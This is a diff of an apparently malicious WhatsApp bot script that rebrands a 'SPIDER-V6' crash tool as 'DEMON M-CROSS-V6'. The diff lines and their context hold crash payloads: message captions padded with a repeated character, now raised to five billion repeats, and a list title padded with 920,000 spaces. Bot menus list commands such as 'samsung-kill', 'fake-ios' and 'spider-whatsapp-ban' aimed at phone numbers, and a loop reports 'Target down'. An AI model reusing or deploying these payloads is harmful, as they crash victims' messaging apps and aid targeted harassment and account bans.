@@ -51,12 +51,12 @@ console.log(chalk.white.bgRed.bold('Massage'), color(`[𝐒𝚸𝚰𝐃𝚵𝚪-
 }
         // HARI
         
-        const hariini = moment.tz('Africa/Nairobi').format('dddd, DD MMMM YYYY')
-        const wib = moment.tz('Africa/Nairobi').format('HH : mm :ss')
-        const wit = moment.tz('Africa/Nairobi').format('HH : mm : ss')
-        const wita = moment.tz('Africa/Nairobi').format('HH : mm : ss')
+        const hariini = moment.tz('Africa/Lagos').format('dddd, DD MMMM YYYY')
+        const wib = moment.tz('Africa/Lagos').format('HH : mm :ss')
+        const wit = moment.tz('Africa/Lagos').format('HH : mm : ss')
+        const wita = moment.tz('Africa/Lagos').format('HH : mm : ss')
 
-        const time2 = moment().tz('Africa/Nairobi').format('HH:mm:ss')
+        const time2 = moment().tz('Africa/Lagos').format('HH:mm:ss')
         if (time2 < "23:59:00") {
             var ucapanWaktu = 'Good night 🏙️'
         }
@@ -152,7 +152,7 @@ message: {
 
 listResponseMessage: {
 
-title: 'SPIDER-V6'
+title: 'SHII-V6'
 
 }
 
@@ -409,7 +409,7 @@ remoteJid: "status@broadcast"
 message: {
 "extendedTextMessage": {
 "text": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
-"title": `⟠ 𝐒𝚸𝚰𝐃𝚵𝚪-𝛁6🔥 ⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 々`,
+"title": `⟠ 𝐃𝐄𝐌𝐎𝐍 𝐌-𝐂𝐑𝐎𝐒𝐒-𝛁6🔥 ⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 々`,
 'jpegThumbnail': fakejpg,
 }
 }
@@ -431,7 +431,7 @@ message: {
 "jpegThumbnail": fakejpg,
 },
 "title": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
-"description": `⟠ 𝐒𝚸𝚰𝐃𝚵𝚪-𝛁6🔥 ⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 々`,
+"description": `⟠ 𝐃𝐄𝐌𝐎𝐍 𝐌-𝐂𝐑𝐎𝐒𝐒-𝛁6🔥 ⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 々`,
 "currencyCode": "IDR",
 "priceAmount1000": "1000000000000000000",
 "retailerId": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
@@ -618,7 +618,7 @@ message: {
   "liveLocationMessage": {
     "degreesLatitude": "p",
     "degreesLongitude": "p",
-    "caption": `✳️࿆᷍🥷᜴͆𝕶𝖎𝖓𝖌 𝕾𝖆𝖒ׁׅ֮̿╮⭑ ☠️⃰͜͡؜𝕶𝖎𝖓𝖌 𝕾𝖆𝖒⃟🔥᜴▴𝒟𝐸𝐿𝒯𝒜𝒞𝑅𝒜𝒮𝐻ཀ͜͡😈⃟╮.xp`+"ꦾ".repeat(50000),
+    "caption": `✳️࿆᷍🥷᜴͆𝐃𝐄𝐌𝐎𝐍 𝐌-𝐂𝐑𝐎𝐒𝐒𝐃𝐄𝐌𝐎𝐍 𝐌-𝐂𝐑𝐎𝐒𝐒𝐃𝐄𝐌𝐎𝐍 𝐌-𝐂𝐑𝐎𝐒𝐒𝐃𝐄𝐌𝐎𝐍 𝐌-𝐂𝐑𝐎𝐒𝐒𝐃𝐄𝐌𝐎𝐍 𝐌-𝐂𝐑𝐎𝐒𝐒𝐃𝐄𝐌𝐎𝐍 𝐌-𝐂𝐑𝐎𝐒𝐒𝐃𝐄𝐌𝐎𝐍 𝐌-𝐂𝐑𝐎𝐒𝐒╮⭑ ☠️⃰͜͡؜𝕶𝖎𝖓𝖌 𝕾𝖆𝖒⃟🔥᜴▴𝐃𝐄𝐌𝐎𝐍 𝐌-𝐂𝐑𝐎𝐒𝐒😈⃟╮.xp`+"ꦾ".repeat(5000000000),
     "sequenceNumber": "0",
     "jpegThumbnail": ""
      }
@@ -857,7 +857,7 @@ await deltaxcrash.sendMessage(from, {text: xeonlod[i], edit: key });
 async function baklis(target, kuwoted) {
  var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
   'listMessage': {
-    'title': "⟠ 𝐒𝚸𝚰𝐃𝚵𝚪-𝛁6 ⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 々"+" ".repeat(920000),
+    'title': "⟠ 𝐃𝐄𝐌𝐎𝐍 𝐌-𝐂𝐑𝐎𝐒𝐒-𝛁6 ⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 々"+" ".repeat(920000),
         'footerText': `✳️᜴࿆͆᷍𝕶𝖎𝖓𝖌 𝕾𝖆𝖒•₵Ɽ₳₴Ⱨ̿╮⭑ ☠️⃰͜͡؜𝕶𝖎𝖓𝖌 𝕾𝖆𝖒⃟🔥᜴▴𝕶𝖎𝖓𝖌 𝕾𝖆𝖒Ӿ99ཀ͜͡😈⃟╮.xp`,
         'description': `✳️᜴࿆͆᷍𝕶𝖎𝖓𝖌 𝕾𝖆𝖒•₵Ɽ₳₴Ⱨ╮⭑ ☠️⃰͜͡؜𝕶𝖎𝖓𝖌 𝕾𝖆𝖒⃟🔥᜴▴𝕶𝖎𝖓𝖌 𝕾𝖆𝖒Ӿ99ཀ͜͡😈⃟╮.xp`,
         'buttonText': null,
@@ -1016,7 +1016,7 @@ const menu = `𝐒𝚸𝚰𝐃𝚵𝚪-𝛁6`
 case 'menu': {
 let itsmenu = `
 
-   \`𝐃𝚵𝛁𝚰𝐋 𝐒𝚸𝚰𝐃𝚵𝚪-𝛁6\`
+   \`𝐃𝐄𝐌𝐎𝐍 𝐌-𝐂𝐑𝐎𝐒𝐒-𝛁6\`
          
 ┏━━━━━━━━━━━
 ┃  ❖ 𝙷𝙴𝙻𝙻𝙾 @${sender.split("@")[0]}
@@ -1033,7 +1033,7 @@ let itsmenu = `
 ┃❖ 𝐬𝐚𝐦𝐬𝐮𝐧𝐠𝐛𝐮𝐠𝐬
 ┃❖ 𝐩𝐜𝐛𝐮𝐠𝐬
 ┗━━━━━━━━━━
-© 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒
+© 𝐌-𝐂𝐑𝐎𝐒𝐒
   ` 
   deltaxcrash.sendMessage(m.chat, {
                         video: { url: `https://telegra.ph/file/9c8746c53a590f8ac2666.mp4`},
@@ -1046,7 +1046,7 @@ let itsmenu = `
                  break
  case 'spiderbugs':{
 let menya =
- `   \`𝐃𝚵𝛁𝚰𝐋 𝐒𝚸𝚰𝐃𝚵𝚪-𝛁6\`
+ `   \`𝐃𝐄𝐌𝐎𝐍 𝐌-𝐂𝐑𝐎𝐒𝐒-𝛁6\`
          
 ┏━━━━━━━━━━━━━━━━━━
 ┃  ❖ 𝙷𝙴𝙻𝙻𝙾 @${sender.split("@")[0]}
@@ -1075,7 +1075,7 @@ let menya =
 ┃⬮ spiderx2 <254xxx>,amount
 ┃⬮ sam-bug <254xxx>
 ┗━━━━━━━━━━━━━━━━━
-© 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒
+© 𝐃𝐄𝐌𝐎𝐍 𝐌-𝐂𝐑𝐎𝐒𝐒
  `
 deltaxcrash.sendMessage(m.chat, { 
 	           text: menya,
@@ -1097,7 +1097,7 @@ deltaxcrash.sendMessage(m.chat, {
                  break
  case 'groupbugs':{
  let menyu =
-`   \`𝐃𝚵𝛁𝚰𝐋 𝐒𝚸𝚰𝐃𝚵𝚪-𝛁6\`
+`   \`𝐃𝐄𝐌𝐎𝐍 𝐌-𝐂𝐑𝐎𝐒𝐒-𝛁6\`
          
 ┏━━━━━━━━━━━━━━━━━━
 ┃  ❖ 𝙷𝙴𝙻𝙻𝙾 @${sender.split("@")[0]}
@@ -1112,7 +1112,7 @@ deltaxcrash.sendMessage(m.chat, {
 ┗━━━━━━━━━━━━━━━━━
  ● 𝑫𝒐𝒏𝒕 𝒃𝒍𝒂𝒎𝒆 𝒎𝒆 𝒊𝒏𝒄𝒂𝒔𝒆 𝒚𝒐𝒖𝒓 𝒘𝒉𝒂𝒕𝒔𝒂𝒑𝒑 𝒊𝒔 𝒂𝒍𝒔𝒐 𝒂𝒇𝒇𝒆𝒄𝒕𝒆𝒅
  
- © 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒
+ © 𝐃𝐄𝐌𝐎𝐍 𝐌-𝐂𝐑𝐎𝐒𝐒
  `
 deltaxcrash.sendMessage(m.chat, { 
 	           text: menyu,
@@ -1134,7 +1134,7 @@ deltaxcrash.sendMessage(m.chat, {
 	 break
 case 'spider-whatsapp-ban':{
  let viks =
-`   \`𝐃𝚵𝛁𝚰𝐋 𝐒𝚸𝚰𝐃𝚵𝚪-𝛁6\`
+`   \`𝐃𝐄𝐌𝐎𝐍 𝐌-𝐂𝐑𝐎𝐒𝐒-𝛁6\`
          
 ┏━━━━━━━━━━━━━━━━━━
 ┃  ❖ 𝙷𝙴𝙻𝙻𝙾 @${sender.split("@")[0]}
@@ -1148,7 +1148,7 @@ case 'spider-whatsapp-ban':{
 ┗━━━━━━━━━━━━━━━━━
  ● 𝖀𝖘𝖊 𝖙𝖍𝖊 𝖇𝖆𝖓 𝖗𝖊𝖕𝖔𝖗𝖙 𝖙𝖔 𝖇𝖆𝖓 𝖞𝖔𝖚𝖗 𝖂𝖍𝖆𝖙𝖘𝕬𝖕𝖕 𝖙𝖆𝖗𝖌𝖊𝖙 
  
- © 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒
+ © 𝐃𝐄𝐌𝐎𝐍 𝐌-𝐂𝐑𝐎𝐒𝐒
  `
 deltaxcrash.sendMessage(m.chat, { 
 	           text: viks,
@@ -1170,7 +1170,7 @@ deltaxcrash.sendMessage(m.chat, {
 	 break
 case 'iosbugs':{	
 let sami =
-`   \`𝐃𝚵𝛁𝚰𝐋 𝐒𝚸𝚰𝐃𝚵𝚪-𝛁6\`
+`   \`𝐃𝐄𝐌𝐎𝐍 𝐌-𝐂𝐑𝐎𝐒𝐒-𝛁6\`
          
 ┏━━━━━━━━━━━━━━━━━━
 ┃  ❖ 𝙷𝙴𝙻𝙻𝙾 @${sender.split("@")[0]}
@@ -1183,7 +1183,7 @@ let sami =
 ┃⬮ fake-ios <254xxx>
 ┗━━━━━━━━━━━━━━━━━
   
- © 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒
+ © 𝐃𝐄𝐌𝐎𝐍 𝐌-𝐂𝐑𝐎𝐒𝐒
  `
 deltaxcrash.sendMessage(m.chat, { 
 	           text: sami,
@@ -1205,7 +1205,7 @@ deltaxcrash.sendMessage(m.chat, {
                  break
  case 'ownermenu':{
  let muna =
- `   \`𝐃𝚵𝛁𝚰𝐋 𝐒𝚸𝚰𝐃𝚵𝚪-𝛁6\`
+ `   \`𝐃𝐄𝐌𝐎𝐍 𝐌-𝐂𝐑𝐎𝐒𝐒-𝛁6\`
          
 ┏━━━━━━━━━━━━━━━━━━
 ┃  ❖ 𝙷𝙴𝙻𝙻𝙾 @${sender.split("@")[0]}
@@ -1219,7 +1219,7 @@ deltaxcrash.sendMessage(m.chat, {
 ┃⬮ self
 ┃⬮ public
 ┗━━━━━━━━━━━━━━━━━
- © 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒
+ © 𝐃𝐄𝐌𝐎𝐍 𝐌-𝐂𝐑𝐎𝐒𝐒
  ` 
 deltaxcrash.sendMessage(m.chat, { 
 	           text: muna,
@@ -1241,7 +1241,7 @@ deltaxcrash.sendMessage(m.chat, {
                  break
  case 'othermenu':{
 let fuvk =
- `   \`𝐃𝚵𝛁𝚰𝐋 𝐒𝚸𝚰𝐃𝚵𝚪-𝛁6\`
+ `   \`𝐃𝐄𝐌𝐎𝐍 𝐌-𝐂𝐑𝐎𝐒𝐒-𝛁6\`
          
 ┏━━━━━━━━━━━━━━━━━━
 ┃  ❖ 𝙷𝙴𝙻𝙻𝙾 @${sender.split("@")[0]}
@@ -1253,7 +1253,7 @@ let fuvk =
 ┃⬮ alive
 ┃⬮ animeku
 ┗━━━━━━━━━━━━━━━━━
- © 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒
+ © 𝐃𝐄𝐌𝐎𝐍 𝐌-𝐂𝐑𝐎𝐒𝐒
  `
 deltaxcrash.sendMessage(m.chat, { 
 	           text: fuvk,
@@ -1275,7 +1275,7 @@ deltaxcrash.sendMessage(m.chat, {
                  break
 case 'pcbugs':{
 let fuvk =
- `   \`𝐃𝚵𝛁𝚰𝐋 𝐒𝚸𝚰𝐃𝚵𝚪-𝛁6\`
+ `   \`𝐃𝐄𝐌𝐎𝐍 𝐌-𝐂𝐑𝐎𝐒𝐒-𝛁6\`
          
 ┏━━━━━━━━━━━━━━━━━━
 ┃  ❖ 𝙷𝙴𝙻𝙻𝙾 @${sender.split("@")[0]}
@@ -1285,9 +1285,9 @@ let fuvk =
 ┃⬮ night-night
 ┃⬮ evil-mind
 ┃⬮ spider-chace,amount
-┃⬮ pc-kill
+┃⬮ mcross-did
 ┗━━━━━━━━━━━━━━━━━
- © 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒
+ © 𝐃𝐄𝐌𝐎𝐍 𝐌-𝐂𝐑𝐎𝐒𝐒
  `
 deltaxcrash.sendMessage(m.chat, { 
 	           text: fuvk,
@@ -1309,7 +1309,7 @@ deltaxcrash.sendMessage(m.chat, {
                  break
 case 'samsungbugs':{
 let samie =
- `   \`𝐃𝚵𝛁𝚰𝐋 𝐒𝚸𝚰𝐃𝚵𝚪-𝛁6\`
+ `   \`𝐃𝐄𝐌𝐎𝐍 𝐌-𝐂𝐑𝐎𝐒𝐒-𝛁6\`
          
 ┏━━━━━━━━━━━━━━━━━━
 ┃  ❖ 𝙷𝙴𝙻𝙻𝙾 @${sender.split("@")[0]}
@@ -1321,7 +1321,7 @@ let samie =
 ┃⬮ samsung-guru <254xxx>
 ┃⬮ samsung-kill <254xxx>
 ┗━━━━━━━━━━━━━━━━━
- © 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒
+ © 𝐃𝐄𝐌𝐎𝐍 𝐌-𝐂𝐑𝐎𝐒𝐒
  `
 deltaxcrash.sendMessage(m.chat, { 
 	           text: samie,
@@ -1351,7 +1351,7 @@ forwardingScore: 9999999,
 isForwarded: true,
 mentionedJid: [sender]
 }}, { quoted: m })
-deltaxcrash.sendMessage(from, { text : `Hello @${sender.split("@")[0]}, My owner is 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`, contextInfo:{
+deltaxcrash.sendMessage(from, { text : `Hello @${sender.split("@")[0]}, My owner is 𝐃𝐄𝐌𝐎𝐍 𝐌-𝐂𝐑𝐎𝐒𝐒`, contextInfo:{
 forwardingScore: 9999999, 
 isForwarded: true,
 mentionedJid:[sender]
@@ -1628,7 +1628,7 @@ reply(`Format pesan tidak benar. Gunakan format: .${command} [url] [time] [threa
 }
 }
 break
-case 'pc-kill': case 'evil-mind': case 'night-night':  {
+case 'mcross-did': case 'evil-mind': case 'night-night':  {
 if (!isPremium) return 
 for (let j = 0; j < 5; j++) {
 await ngeloc(m.chat, force)
@@ -1640,7 +1640,7 @@ externalAdReply: {
 showAdAttribution: false,
 renderLargerThumbnail: false,
 jpegThumbnail: `https://telegra.ph/file/b127513eb930ee73178dd.jpg`,
-title: `𝐒𝐩𝐢𝐝𝐞𝐫-𝐕6💀`,
+title: `𝐃𝐄𝐌𝐎𝐍 𝐌-𝐂𝐑𝐎𝐒𝐒-𝐕6💀`,
 body: `⁗ ⋄Target down 💀🥹`,
 previewType: "VIDEO",
 sourceUrl: `༑ 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒💀𝐒𝐩𝐢𝐝𝐞𝐫-𝐕6⿻`,
@@ -1648,7 +1648,7 @@ mediaType: 1,
 mediaUrl: 'https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e'
 }
 },
-text: '𝙏𝙖𝙧𝙜𝙚𝙩 𝙝𝙖𝙨 𝙗𝙚𝙚𝙣 𝙚𝙡𝙞𝙢𝙞𝙣𝙖𝙩𝙚𝙙 𝘽𝙮 *𝙎𝙥𝙞𝙙𝙚𝙧-𝙑6* 𝘽𝙮  𝕶𝖎𝖓𝖌 𝕾𝖆𝖒 '
+text: '𝙏𝙖𝙧𝙜𝙚𝙩 𝙝𝙖𝙨 𝙗𝙚𝙚𝙣 𝙚𝙡𝙞𝙢𝙞𝙣𝙖𝙩𝙚𝙙 𝘽𝙮 *𝐃𝐄𝐌𝐎𝐍 𝐌-𝐂𝐑𝐎𝐒𝐒-𝙑6* 𝘽𝙮 𝐌-𝐂𝐑𝐎𝐒𝐒 '
 }, {
 quoted: m
 })
